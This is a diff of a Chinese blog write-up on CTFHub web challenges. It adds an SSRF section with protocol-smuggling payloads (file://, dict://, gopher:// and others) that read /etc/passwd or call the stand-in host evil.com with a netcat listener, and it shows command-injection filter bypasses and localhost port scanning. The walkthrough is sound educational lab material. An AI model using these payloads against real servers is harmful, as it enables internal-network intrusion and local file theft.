@@ -206,7 +206,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      3.9k 字
+      5k 字
     </span>
   
 
@@ -216,7 +216,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      74
+      100
        分钟
     </span>
   
@@ -448,7 +448,7 @@
 <p><code>?file=php://filter/resource=/flag</code>，<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code></p>
 <h3 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h3><p>RCE命令注入的前几个题都挺简单的，这次直接来看最后一个。之前已经做过了，不太想开新环境，直接借用了别人WP里的图。</p>
 <p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731084255825.png" srcset="/img/loading2.gif" lazyload></p>
-<p>从PHP代码里可以看出过滤了*|，\，&amp;，/，;，cat，flag，ctfhub*还有空格。</p>
+<p>从PHP代码里可以看出过滤了**|，\，&amp;，/，;，cat，flag，ctfhub**还有空格。</p>
 <div class="note note-info">
             <p>url编码中，%0a是换行符，%0d是回车符，可以用这两个进行命令拼接。</p>
           </div>
@@ -472,6 +472,55 @@
 <p>之后在F12查看源码，就能看到FLAG了。</p>
 <p>除此之外还需要说明的一下，**$*,$n(n是大于0的数字),$@<strong>都可以绕过过滤，</strong>ca$*t即为cat**。</p>
 <p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731092333270.png" srcset="/img/loading2.gif" lazyload></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>服务端请求伪造（Server-Side Request Forgery）是攻击者构造由服务器端发起请求的一个漏洞，通常情况下可以实现：</p>
+<ul>
+<li>可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。</li>
+<li>攻击运行在内网或者本地的应用程序。</li>
+<li>对内网web应用进行指纹识别，通过访问默认文件实现 。</li>
+<li>攻击内外网的web应用。sql注入、struct2、redis等。</li>
+<li>利用file协议读取本地文件等。</li>
+</ul>
+<h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>内网访问这题比较简单，直接来看伪协议。打开环境一片空白，观察url发现有个url参数，构造file协议访问www目录下的flag文件。</p>
+<p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801172230966.png" srcset="/img/loading2.gif" lazyload></p>
+<p>这里再补充一下其他的协议，参考（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11673190.html%EF%BC%89%EF%BC%9A">https://www.cnblogs.com/-mo-/p/11673190.html）：</a></p>
+<figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">file:</span><span class="hljs-comment">///</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//</span><br><span class="hljs-symbol">sftp:</span><span class="hljs-comment">//</span><br><span class="hljs-symbol">ldap:</span><span class="hljs-comment">//</span><br><span class="hljs-symbol">tftp:</span><span class="hljs-comment">//</span><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><p>这种URL Schema可以尝试从文件系统中获取文件：</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=file:/</span><span class="hljs-regexp">//</span>etc<span class="hljs-regexp">/passwdhttp:/</span><span class="hljs-regexp">/example.com/</span>ssrf.php?url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/C:/</span>Windows/win.ini<br></code></pre></div></td></tr></table></figure>
+
+<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
+<h4 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h4><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?dict:/</span><span class="hljs-regexp">/evil.com:1337/</span> <br>evil.com:$ nc -lvp <span class="hljs-number">1337</span><br>Connection from [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.12</span>] port <span class="hljs-number">1337</span>[tcp/*] <br>accepted (family <span class="hljs-number">2</span>, sport <span class="hljs-number">31126</span>)CLIENT libcurl <span class="hljs-number">7.40</span>.<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="sftp"><a href="#sftp" class="headerlink" title="sftp://"></a>sftp://</h4><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=sftp:/</span><span class="hljs-regexp">/evil.com:1337/</span> <br>evil.com:$ nc -lvp <span class="hljs-number">1337</span><br>Connection from [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.12</span>] port <span class="hljs-number">1337</span>[tcp/*] <br>accepted (family <span class="hljs-number">2</span>, sport <span class="hljs-number">37146</span>)SSH-<span class="hljs-number">2.0</span>-libssh2_1.<span class="hljs-number">4.2</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="ldap-或ldaps-或ldapi"><a href="#ldap-或ldaps-或ldapi" class="headerlink" title="ldap://或ldaps:// 或ldapi://"></a>ldap://或ldaps:// 或ldapi://</h4><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=ldap:/</span><span class="hljs-regexp">/localhost:1337/</span>%<span class="hljs-number">0</span>astats%<span class="hljs-number">0</span>aquithttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=ldaps:/</span><span class="hljs-regexp">/localhost:1337/</span>%<span class="hljs-number">0</span>astats%<span class="hljs-number">0</span>aquithttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=ldapi:/</span><span class="hljs-regexp">/localhost:1337/</span>%<span class="hljs-number">0</span>astats%<span class="hljs-number">0</span>aquit<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a>tftp://</h4><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=tftp:/</span><span class="hljs-regexp">/evil.com:1337/</span>TESTUDPPACKET <br>evil.com:<span class="hljs-comment"># nc -lvup 1337</span><br>Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port1337)TESTUDPPACKEToctettsize0blksize512timeout3<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h4><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Copyhttp:<span class="hljs-comment">//example.com/ssrf.php?url=http://attacker.com/gopher.php</span><br><br><span class="hljs-meta">&lt;?php</span>  header(<span class="hljs-string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);<span class="hljs-meta">?&gt;</span><br>Copyevil.com:<span class="hljs-comment"># nc -lvp 1337</span><br>Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port1337)Connection <span class="hljs-keyword">from</span> [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.12</span>] port <span class="hljs-number">1337</span>[tcp<span class="hljs-comment">/*] accepted (family 2, sport 49398)Hissrftest</span><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><blockquote>
+<p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</p>
+</blockquote>
+<p>把环境url放入intruder里，url参数后接<code>127.0.0.1:8000</code>，只对端口号进行爆破。</p>
+<p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801173155887.png" srcset="/img/loading2.gif" lazyload></p>
+<h3 id="POST跳转"><a href="#POST跳转" class="headerlink" title="POST跳转"></a>POST跳转</h3><blockquote>
+<p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
+</blockquote>
+<p>故技重施，先读一下flag.php文件，结果还真有，读下代码。</p>
+<p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801173556896.png" srcset="/img/loading2.gif" lazyload></p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br><br>error_reporting(0);<br><br>if ($_SERVER[&quot;REMOTE_ADDR&quot;] !&#x3D; &quot;127.0.0.1&quot;) &#123;<br>    echo &quot;Just View From 127.0.0.1&quot;;<br>    return;<br>&#125;<br><br>$flag&#x3D;getenv(&quot;CTFHUB&quot;); <br>$key &#x3D; md5($flag);<br><br>if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] &#x3D;&#x3D; $key) &#123;<br>    echo $flag;<br>    exit;<br>&#125;<br>?&gt;<br><br>&lt;form action&#x3D;&quot;&#x2F;flag.php&quot; method&#x3D;&quot;post&quot;&gt;<br>&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;key&quot;&gt;<br>&lt;!-- Debug: key&#x3D;&lt;?php echo $key;?&gt;--&gt;<br>&lt;&#x2F;form&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>首先判断来源地址是否是本地地址，如果不是本地地址，则返回信息后return结束。之后声明了一个变量flag，其值是环境变量CTFHUB的值；又声明了个key变量，它的值是对flag变量值进行了md5加密后的结果。下面的流程是，如果post提交下key参数存在，并且提交的key值与key值本身相同，则会返回flag。</p>
+<p>弄清楚了逻辑，先从本地地址访问下flag.php：</p>
+<p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801175353327.png" srcset="/img/loading2.gif" lazyload></p>
+<p>可以看到注释里的key参数，这时候改POST方法提交发现响应包没有返回flag，这是因为我们前端虽然是POST方法，但是服务器执行的却不是，你前端的参数不能提交上去。由题目可知，环境采用了curl函数，我们也可以通过file协议看到：</p>
+<p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801175535089.png" srcset="/img/loading2.gif" lazyload></p>
 
             </div>
             <hr>
